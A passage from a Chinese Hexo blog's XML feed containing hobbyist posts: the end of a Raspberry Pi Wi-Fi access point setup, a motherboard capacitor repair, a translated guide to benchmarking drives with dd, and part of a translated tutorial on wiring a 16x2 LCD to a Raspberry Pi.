class="hljs-comment"># ipconfig 配置的无线网卡地址</span></span><br><span class="line"><span class="hljs-attr">listen-address</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span></span><br><span class="line">bind-interfaces</span><br><span class="line"><span class="hljs-attr">dhcp-range</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">0.100</span>,<span class="hljs-number">192.168</span>.<span class="hljs-number">0.150</span>,<span class="hljs-number">12</span>h</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Google DNS</span></span><br><span class="line"><span class="hljs-attr">server</span>=<span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span></span><br><span class="line"><span class="hljs-attr">server</span>=<span class="hljs-number">8.8</span>.<span class="hljs-number">4.4</span></span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>修改（新建） <code>resolv.dnsmasq.conf</code> <sup><a href="https://wiki.archlinux.org/index.php/Resolv.conf" target="_blank" rel="noopener">[3]</a></sup></p><p><code>vim /etc/resolv.dnsmasq.conf</code>，增加：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nameserver 127.0.0.1</span><br></pre></td></tr></table></figure></li><li><p>启动</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start dnsmasq</span><br></pre></td></tr></table></figure></li></ol><h2 id="启用包转发和-NAT"><a href="#启用包转发和-NAT" class="headerlink" title="启用包转发和 NAT"></a>启用包转发和 NAT</h2><ol><li><p>检查当前转发设置</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -a | grep forward</span><br></pre></td></tr></table></figure></li><li><p>临时启用包转发</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure></li><li><p>编辑 /etc/sysctl.d/30-ipforward.conf 使每次启动时生效</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward=1</span><br><span class="line">net.ipv6.conf.default.forwarding=1</span><br><span class="line">net.ipv6.conf.all.forwarding=1</span><br></pre></td></tr></table></figure></li><li><p>启用 NAT</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT</span><br></pre></td></tr></table></figure></li><li><p>导出 NAT 规则至文件</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables-save &gt; /etc/iptables/ap.rules</span><br></pre></td></tr></table></figure></li></ol><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li><p>如果网速不稳定，请确认是否安装了 haveged</p></li><li><p>上面配置完成后，每次重启后运行以下脚本即可</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0 192.168.0.1/24</span><br><span class="line">systemctl start dnsmasq</span><br><span class="line">iptables-restore &lt; /etc/iptables/ap.rules</span><br><span class="line">sysctl net.ipv4.ip_forward=1</span><br><span class="line">systemctl start hostapd</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 树莓派 </tag>
            
            <tag> Arch Linux </tag>
            
            <tag> hostapd </tag>
            
            <tag> dnsmasq </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主板维修——更换爆浆电容</title>
      <link href="/hexo-blog/20150421/%E4%B8%BB%E6%9D%BF%E7%BB%B4%E4%BF%AE%E2%80%94%E2%80%94%E6%9B%B4%E6%8D%A2%E7%88%86%E6%B5%86%E7%94%B5%E5%AE%B9/"/>
      <url>/hexo-blog/20150421/%E4%B8%BB%E6%9D%BF%E7%BB%B4%E4%BF%AE%E2%80%94%E2%80%94%E6%9B%B4%E6%8D%A2%E7%88%86%E6%B5%86%E7%94%B5%E5%AE%B9/</url>
      
        <content type="html"><![CDATA[<p>家里的电脑买了七、八年了，最近显示器突然出现了偶尔无法正常工作，桌面黑屏，画面无法刷新的情况。</p><p>首先怀疑是显卡问题，但是该主板没有独立显卡，是集成显卡，所以问题也就转移到了主板了。</p><a id="more"></a> <img src="/hexo-blog/20150421/主板维修——更换爆浆电容/IMAG0001.jpg"><p>仔细观察了一下主板上的电容，发现果然有一个爆浆了，如图。记下规格：6.3V 1500μF。</p><img src="/hexo-blog/20150421/主板维修——更换爆浆电容/IMAG0002.jpg"><p>下面是具体维修步骤：</p><p>1. 从机箱上卸下主板，卸下风扇，将灰尘清理干净</p><img src="/hexo-blog/20150421/主板维修——更换爆浆电容/IMAG0003.jpg"><p>2. 焊下爆浆的电容</p><img src="/hexo-blog/20150421/主板维修——更换爆浆电容/IMAG0004.jpg"><p>用烙铁拆卸电容是一定要注意，因为主板制造工艺与一般家电不同，大部分烙铁无法轻松地将其焊下来，所以最好使用加焊法，即同时给两个焊点加焊至熔化，然后轻轻取下。</p><p>然后从旧主板上拆下两个同型号的电容，当然也可以从电子城买到。</p><img src="/hexo-blog/20150421/主板维修——更换爆浆电容/IMAG0005.jpg"> <img src="/hexo-blog/20150421/主板维修——更换爆浆电容/IMAG0006.jpg"><p>左边是爆浆的电容，右边是好电容</p><p>3. 焊上好的电容</p><p>焊接前最好用大头针将主板孔清理干净，然后将电容轻轻插入，注意正负极。加松香、焊锡焊接。</p><img src="/hexo-blog/20150421/主板维修——更换爆浆电容/IMAG0007.jpg"><p>焊好后用酒精擦除掉残留的松香。</p><img src="/hexo-blog/20150421/主板维修——更换爆浆电容/IMAG0010.jpg"><p>4. 最终效果图</p><img src="/hexo-blog/20150421/主板维修——更换爆浆电容/IMAG0008.jpg"> <img src="/hexo-blog/20150421/主板维修——更换爆浆电容/IMAG0009.jpg"><p>5. 成功点亮，问题解决</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 主板 </tag>
            
            <tag> 维修 </tag>
            
            <tag> 硬件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 dd 命令测试 USB 和 SSD 硬盘的读写速度</title>
      <link href="/hexo-blog/20150413/%E4%BD%BF%E7%94%A8-dd-%E5%91%BD%E4%BB%A4%E6%B5%8B%E8%AF%95-USB-%E5%92%8C-SSD-%E7%A1%AC%E7%9B%98%E7%9A%84%E8%AF%BB%E5%86%99%E9%80%9F%E5%BA%A6/"/>
      <url>/hexo-blog/20150413/%E4%BD%BF%E7%94%A8-dd-%E5%91%BD%E4%BB%A4%E6%B5%8B%E8%AF%95-USB-%E5%92%8C-SSD-%E7%A1%AC%E7%9B%98%E7%9A%84%E8%AF%BB%E5%86%99%E9%80%9F%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>来源：binarytides</em> <em>原文：</em> <a href="http://www.binarytides.com/linux-test-drive-speed/" target="_blank" rel="noopener">http://www.binarytides.com/linux-test-drive-speed/</a><br><em>译文：</em> <a href="http://lctt.github.io/" target="_blank" rel="noopener">LCTT</a> <a href="http://linux.cn/article-3696-1.html" target="_blank" rel="noopener">http://linux.cn/article-3696-1.html</a> <em>译者：runningwater</em></p></blockquote><h2 id="磁盘驱动器速度"><a href="#磁盘驱动器速度" class="headerlink" title="磁盘驱动器速度"></a>磁盘驱动器速度</h2><p>磁盘驱动器的速度是以一个单位时间内读写数据量的多少来衡量的。<code>dd</code> 命令是一个简单的命令行工具，它可用对磁盘进行任意数据块的读取和写入，同时可以度量读取写入的速度。</p><p>在这篇文章中，我们将会使用 <code>dd</code> 命令来测试 USB 和 SSD 磁盘的读取和写入速度。</p><a id="more"></a><p>数据传输速度不但取决于驱动盘本身，而且还与连接的接口有关。比如，USB 2.0 端口的最大传输速度是 35 兆字节/秒，所以如果您把一个支持高速传输的 USB 3.0 驱动盘插入 USB 2.0 端口的话，它实际的传输速度将是 2.0 端口的下限。</p><p>这对于 SSD 也是一样的。 SSD 连接的 SATA 端口有不同的类型。平均是 375 兆字节/秒的 SATA 2.0 端口理论上最大传输速度是 3 Gbit/秒，而 SATA 3.0 是这个速度的两倍。</p><h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><p>挂载上驱动盘，从终端进入此盘目录下。然后使用 <code>dd</code> 命令，首先写入固定大小块的一个文件，接着读取这个文件。</p><p><code>dd</code> 命令通用语法格式如下：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="hljs-keyword">if</span>=path/to/input_file of=/path/to/output_file bs=block_size count=number_of_blocks</span><br></pre></td></tr></table></figure><p>当写入到驱动盘的时候，我们简单的从无穷无用字节的源 <code>/dev/zero</code> 读取，当从驱动盘读取的时候，我们读取的是刚才的文件，并把输出结果发送到无用的 <code>/dev/null</code>。在整个操作过程中， <code>dd</code> 命令会跟踪数据传输的速度并且报告出结果。</p><h2 id="固态硬盘"><a href="#固态硬盘" class="headerlink" title="固态硬盘"></a>固态硬盘</h2><p>我们使用的是一块“三星 Evo 120G” 的固态硬盘。它性价比很高，很适合刚开始用固态硬盘的用户，也是我的第一块固态硬盘，并且也是市场上效果最好的固态硬盘之一。</p><p>这次实验中，我们把硬盘接在 SATA 2.0 端口上。</p><h3 id="写入速度"><a href="#写入速度" class="headerlink" title="写入速度"></a>写入速度</h3><p>首先让我们写入固态硬盘</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="hljs-keyword">if</span>=/dev/zero of=./largefile bs=1M count=1024</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1024+0 records in</span><br><span class="line">1024+0 records out</span><br><span class="line">1073741824 bytes (1.1 GB) copied, 4.82364 s, 223 MB/s</span><br></pre></td></tr></table></figure><p>1M 的大小实际上是相当大的。你可以尝试用更小的尺寸如 64K 甚至是 4K 的。</p><h3 id="读取速度"><a href="#读取速度" class="headerlink" title="读取速度"></a>读取速度</h3><p>现在读回这个文件。但是，得首先清除内存的缓存，以确保这个文件确实是从驱动盘读取的。</p><p>运行下面的命令来清除内存缓存</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="hljs-string">"sync &amp;&amp; echo 3 &gt; /proc/sys/vm/drop_caches"</span></span><br></pre></td></tr></table></figure><p>现在读取此文件</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="hljs-keyword">if</span>=./largefile of=/dev/null bs=4k</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">165118+0 records in</span><br><span class="line">165118+0 records out</span><br><span class="line">676323328 bytes (676 MB) copied, 3.0114 s, 225 MB/s</span><br></pre></td></tr></table></figure><p>在 Arch Linux 的维基页上有一整页的关于不同的厂商，如英特尔、三星、Sandisk 等提供的各类固态硬盘 读/写速度的信息。点击如下的 url 可以查看相关信息。</p><p><a href="https://wiki.archlinux.org/index.php/SSD_Benchmarking" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/SSD_Benchmarking</a></p><h2 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h2><p>此次实验我们会测量普通的 USB/随身笔的读写速度。驱动盘都是接入标准的 USB 2.0 端口的。首先用的是一个 4GB 大小的 sony USB 驱动盘，随后用的是一个 16GB 大小的 strontium 驱动盘。</p><p>首先把驱动盘插入端口，并挂载上，使其可读。然后从命令行下面进入挂载的文件目录下。</p><h3 id="Sony-4GB-写入"><a href="#Sony-4GB-写入" class="headerlink" title="Sony 4GB - 写入"></a>Sony 4GB - 写入</h3><p>这个实验中，用 dd 命令向驱动盘写入一个有 10000 块，每块 8K 字节的文件。</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="hljs-keyword">if</span>=/dev/zero of=./largefile bs=8k count=10000</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10000+0 records in</span><br><span class="line">10000+0 records out</span><br><span class="line">81920000 bytes (82 MB) copied, 11.0626 s, 7.4 MB/s</span><br></pre></td></tr></table></figure><p>因此，写入速度约为7.5兆字节/秒。这是一个很低的数字。</p><h3 id="Sony-4GB-读取"><a href="#Sony-4GB-读取" class="headerlink" title="Sony 4GB - 读取"></a>Sony 4GB - 读取</h3><p>把相同的文件读取回来，测试速度。首先运行如下命令清除内存缓存。</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="hljs-string">"sync &amp;&amp; echo 3 &gt; /proc/sys/vm/drop_caches"</span></span><br></pre></td></tr></table></figure><p>现在就可以使用 dd 命令来读取文件了。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=./largefile of=/dev/null bs=8k</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8000+0 records in</span><br><span class="line">8000+0 records out</span><br><span class="line">65536000 bytes (66 MB) copied, 2.65218 s, 24.7 MB/s</span><br></pre></td></tr></table></figure><p>读取速度出来大约是25兆字节/秒，这大致跟廉价 USB 驱动盘的标准相匹配吧。</p><p>USB2.0 理论上最大信号传输速率为480兆比特/秒，最小为60兆字节/秒。然而，由于各种限制实际传输速率大约280兆比特/秒和35兆字节/秒之间。除了这个，实际的速度还取决于驱动盘本身的质量好坏以及其他的因素。</p><p>上面实验中， USB 驱动盘插入USB 2.0 端口，读取的速度达到了 24.7兆字节/秒，这是很不错的读速度。但写入速度就不敢恭维了。</p><p>下面让我们用 16GB 的 Strontium 驱动盘来做相同的实验。虽然 Strontium 的 USB 驱动盘很稳定，但它也是一款很便宜的品牌。</p><h3 id="Strontium-16gb-盘写入速度"><a href="#Strontium-16gb-盘写入速度" class="headerlink" title="Strontium 16gb 盘写入速度"></a>Strontium 16gb 盘写入速度</h3><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="hljs-keyword">if</span>=/dev/zero of=./largefile bs=64k count=1000</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1000+0 records in</span><br><span class="line">1000+0 records out</span><br><span class="line">65536000 bytes (66 MB) copied, 8.3834 s, 7.8 MB/s</span><br></pre></td></tr></table></figure><h3 id="Strontium-16gb-盘读取速度"><a href="#Strontium-16gb-盘读取速度" class="headerlink" title="Strontium 16gb 盘读取速度"></a>Strontium 16gb 盘读取速度</h3><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="hljs-string">"sync &amp;&amp; echo 3 &gt; /proc/sys/vm/drop_caches"</span></span><br><span class="line">dd <span class="hljs-keyword">if</span>=./largefile of=/dev/null bs=8k</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8000+0 records in</span><br><span class="line">8000+0 records out</span><br><span class="line">65536000 bytes (66 MB) copied, 2.90366 s, 22.6 MB/s</span><br></pre></td></tr></table></figure><p>它的读取速度就要比 Sony 的低了。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="http://en.wikipedia.org/wiki/USB" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/USB</a></li><li><a href="https://wiki.archlinux.org/index.php/SSD_Benchmarking" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/SSD_Benchmarking</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用树莓派驱动一个 16×2 的 LCD</title>
      <link href="/hexo-blog/20150412/%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A9%B1%E5%8A%A8%E4%B8%80%E4%B8%AA-16%C3%972-%E7%9A%84-LCD/"/>
      <url>/hexo-blog/20150412/%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A9%B1%E5%8A%A8%E4%B8%80%E4%B8%AA-16%C3%972-%E7%9A%84-LCD/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文链接：<a href="http://learn.adafruit.com/drive-a-16x2-lcd-directly-with-a-raspberry-pi/" target="_blank" rel="noopener">Mikey Sklar</a><br>译文链接：<a href="http://www.geekfan.net/5588/" target="_blank" rel="noopener">http://www.geekfan.net/5588/</a> 翻译：<a href="http://www.geekfan.net/" target="_blank" rel="noopener">极客范</a> - <a href="http://www.geekfan.net/author/tien/" target="_blank" rel="noopener">tien</a></p></blockquote><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/fa37675fb05216924dc2e6dbe19ec89b.jpg"><p>不管什么项目，如果加上一个液晶显示屏的话肯定都会看起来更棒。这篇文章将详解如何用树莓派的六个通用端口（GPIO）来连接一个廉价的HDD44780的小型LCD。当然也有用I2C或是UART来连接LCD的， 但是使用GPIO是最直接的方法。</p><p>这种方法的几个优势：</p><ul><li>使得廉价的LCD得以应用</li><li>不需要I2C的驱动器</li><li>不会占用树莓派仅有的USB口</li></ul><a id="more"></a><p>以下是用Python代码控制显示的时间日期以及IP地址。如果你的树莓派运行在Headless模式下（Headless模式是系统的一种配置模式。在该模式下系统缺少了显示设备、键盘或鼠标），能有个小的显示屏显示IP地址可是很有吸引力的。</p><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/timeip.jpg-1345243868.jpg"><h2 id="以下是完成本次教程的必要硬件"><a href="#以下是完成本次教程的必要硬件" class="headerlink" title="以下是完成本次教程的必要硬件"></a>以下是完成本次教程的必要硬件</h2><ul><li>一个标准的16×2的LCD</li><li>Adafruit Pi Cobbler （树莓派GPIO的扩展设备，这里是以Cobbler为例，当然也可以用树莓派的breakout）</li><li>面包板</li><li>连接线</li><li>一个树莓派</li></ul><p>本教程只适用于16×1, 16×2, 20×2, 20×4 的LCD</p><h2 id="连接Cobbler到LCD上"><a href="#连接Cobbler到LCD上" class="headerlink" title="连接Cobbler到LCD上"></a>连接Cobbler到LCD上</h2><h3 id="LCD"><a href="#LCD" class="headerlink" title="LCD"></a>LCD</h3><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/8c9f49c826456da26aaa43c41caf3475.jpg"><p>任何一个拥有16个引脚的LCD基本上都是用HD44780控制器来控制的。 这种类型的LCD的引脚都拥有相同的输入输出功能，所以比较容易使用。LCD采用的是并行接口，这就意味着树莓派需要提供多个引脚来控制它。本篇教程中我们会用到树莓派的4个数据引脚（4位模式）和两个控制引脚。</p><p>数据引脚可以直接传输数据到LCD上， 这里我们只让LCD处于写模式，不读取任何数据。</p><p>寄存器的选择引脚有两种用途。当设置为低位时，它可以发送指令到LCD（比如显示的位置或是清空屏幕），可理解为命令寄存器。 当设置为高位的时候，它使得LCD转为数据模式并且将数据传输到屏幕上。</p><p>读/写引脚在这里会被设置成低位（写模式），因为我们只是想让LCD作为一个输出设备。</p><p>LCD 各个引脚的定义：</p><ol><li>Ground</li><li>VCC - 5v not 3.3v</li><li>Contrast adjustment (VO) from potentiometer</li><li>Register Select (RS). RS=0: Command, RS=1: Data</li><li>Read/Write (R/W). R/W=0: Write, R/W=1: Read (we won’t use this pin)</li><li>Clock (Enable). Falling edge triggered</li><li>Bit 0 (Not used in 4-bit operation)</li><li>Bit 1 (Not used in 4-bit operation)</li><li>Bit 2 (Not used in 4-bit operation)</li><li>Bit 3 (Not used in 4-bit operation)</li><li>Bit 4</li><li>Bit 5</li><li>Bit 6</li><li>Bit 7</li><li>Backlight LED Anode (+)</li><li>Backlight LED Cathode (-)</li></ol><p>在连接这些引脚之前，先确认你的LCD的背光是否可以正常工作，背光应为LED的背光因为这只需要10－40mA的功率，但是若为EL的背光就需要200mA以上的功率了。EL背光的LCD往往会便宜些但是用起来比较难操作，确保你的LCD不是EL背光，否则会将整个树莓派的功率拖下来。还有一些LCD的LED背光没有自带的稳压电阻，所以在连接前要去确定好你的LCD是否需要加载额外的电阻来保证背光LED正常工作。</p><h3 id="线路图"><a href="#线路图" class="headerlink" title="线路图"></a>线路图</h3><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/3db9e92acf8950c82f66b894aaf9f7ae.gif"><p>首先将Cobber的电源引脚连接到面包板的供电轨上。+5V的用红线连接到红线轨上（译者认为这里连接3.3V的就够了）， GND用黑线连接到蓝线轨上， 为了能使数据传到LCD上，我们将进行以下的连接。</p><ul><li>LCD的Pin 1脚接地(黑线)</li><li>LCD的Pin 2脚接 +5V(红线)</li><li>LCD的Pin 3脚接到分压器的中间位置（橙线）</li><li>LCD的Pin 4脚接到Cobber的 #25位 （黄线）</li><li>LCD的Pin 5脚接地（黑线）</li><li>LCD的Pin 6脚接到Cobber的#24位</li><li>LCD的Pin 7，8，9，10什么都不接</li><li>LCD的Pin 11脚接 Cobber的 ＃23位（蓝线）</li><li>LCD的Pin 12脚接 Cobber的 ＃17位 （紫线）</li><li>LCD的Pin 13脚接 Cobber的 ＃21位 （灰线）（译者推荐这里连接＃18位）</li><li>LCD的Pin 14脚接 Cobber的 ＃22位 （白线）</li><li>LCD的Pin 15脚接 +5V（红线）</li><li>LCD的Pin 16脚接地 （黑线）</li></ul><p>分压器左边的引脚接地（黑线），右边的引脚接+5V（红线）。</p><h3 id="原理图"><a href="#原理图" class="headerlink" title="原理图"></a>原理图</h3><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/911af7aa209e00b49f3d6fd2afa92564.png"><h3 id="5V-LCD-vs-3-3V-Pi"><a href="#5V-LCD-vs-3-3V-Pi" class="headerlink" title="5V LCD vs 3.3V Pi"></a>5V LCD vs 3.3V Pi</h3><p>树莓派配置的通用接口（GPIO）为3.3V，但是我们的LCD是需要5V配电的设备。如果我们仅仅是用LCD做树莓派的输出设备的话，连接5V的引脚当然没有问题。所以我们这里不使用Cobbler上3.3V的Pin口，并且我们将LCD上的RW（读写）脚接地，这样就避免了LCD向树莓派发送+5V的信号。</p><h3 id="准备LCD"><a href="#准备LCD" class="headerlink" title="准备LCD"></a>准备LCD</h3><p>在你开始前，确认你有一组 0.1“规格的引脚和一个阻值为10K的分压器。</p><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/78f0805fa8ffadabda721fdaf85b3ca9.jpg"><p>大部分LCD显示屏是需要16个引脚的，如果头部太长，可以适当剪短到合适的长度即可。</p><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/7070ba29661c7607983e1339f469f3e7.jpg"><p>接着你需要将引脚和LCD焊接到一起。你必须这么做，不能只是扣上去就完事了。</p><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/db0c101e83a4d48eea6b4a210f5f9c93.jpg"><p>首先将Cobbler上的+5V引脚跟GND引脚连接到面包板上。接着如图连接LCD的Pin1脚、Pin2脚、Pin15脚和Pin16脚连接到面包板的供电轨上。这个时候LCD的背光应该就亮了，如果没有亮请检查你的线路是否连接正常。</p><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/ab7e95346facb755fa274b5618717266.jpg"> <img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/e95255be208612e8b98c504f3334e78c.jpg"><p>接着，将分压器中间的引脚按图中所示连接到LCD的Pin脚3上，其他两个引脚分别连接5V电源和地线。</p><p>扭动分压器直到LCD的第一行显示出方块来。如果看不到，检查一下线路是否连接正确。</p><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/7884cbea595a4f64acbfc81bb40bf5c1.jpg"><p>按照电路图所示完成LCD最后RS（Pin 4脚），RW（Pin 5脚）， EN（Pin 6脚）， D4（Pin 11脚）， D5（Pin 12脚）， D6（Pin 13脚）和D7（Pin 14脚）的连接。</p><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/09609cce51d6920fa5433fce90c9c693.jpg"><p>到这里，就可以用Python脚本来驱动LCD显示些东西了。</p><h2 id="必要的Python包"><a href="#必要的Python包" class="headerlink" title="必要的Python包"></a>必要的Python包</h2><p>本教程是基于Debian的Wheezy系统写成的。必须要安装以下组件才能使用树莓派的GPIO口。</p><p>安装python（2.x）的最新开发套件：</p><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/dd30157fec518880249d8531d5d482d0.gif"><p>安装如下组件：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-setuptools</span><br><span class="line">sudo easy_install -U distribute </span><br><span class="line">sudo apt-get install python-pip</span><br></pre></td></tr></table></figure><p>安装 RPi.GPIO 0.3.1a:</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install rpi.gpio</span><br></pre></td></tr></table></figure><h2 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>可以在Github获得控制LCD的Python脚本。其中包括两个文件：</p><ol><li>Adafruit_CharLCD.py —该文件中包含用来控制LCD的Python类</li><li>Adafruit_CharLCD_IPclock_example.py — 样例程序，用来显示IP地址、日期时间。</li></ol><p>第一个文件Adafruit_CharLCD.py将两个LCD的控制代码混合在了一起。感谢Github上的用户lrvick，他用一个Python类将它们漂亮的封装在一起。</p><p>将代码加载到树莓派上的最简单的方法就是将树莓派连上网络，然后直接通过git的clone命令来下载。只要在合适的目录下（比如说/home/pi/）键入以下命令即可：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install git</span><br><span class="line">git <span class="hljs-built_in">clone</span> http://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code.git</span><br><span class="line"><span class="hljs-built_in">cd</span> Adafruit-Raspberry-Pi-Python-Code</span><br><span class="line"><span class="hljs-built_in">cd</span> Adafruit_CharLCD</span><br></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>现在你就可以测试之前连接好的线路了，只要简单运行Python代码Adafruit_CharLCD.py即可。因为这里的代码很少，它只会简单的显示出一段测试消息。</p><p>无论你使用的是什么型号的树莓派，译者在这里建议大家将引脚21替换换为引脚18， 所以这里要对 Adafruit_CharLCD.py做一个小小的改动，将：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, pin_rs=<span class="hljs-number">25</span>, pin_e=<span class="hljs-number">24</span>, pins_db=[<span class="hljs-number">23</span>, <span class="hljs-number">17</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>], GPIO = None)</span>:</span></span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, pin_rs=<span class="hljs-number">25</span>, pin_e=<span class="hljs-number">24</span>, pins_db=[<span class="hljs-number">23</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">22</span>], GPIO = None)</span>:</span></span><br></pre></td></tr></table></figure><p>可以使用nano编辑器来修改代码。</p><p>下图为译者按照参考进行的试验，整体进行很顺利，提醒一下译者连接的时候就是用的树莓派的Pin #18口 而不是原文作者使用的#21或者#27。（顺便让译者的小黄人stuart也上一下镜，希望大家喜欢 :D ）</p><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/WP_20140119_004.jpg"><h3 id="IP和时钟的显示"><a href="#IP和时钟的显示" class="headerlink" 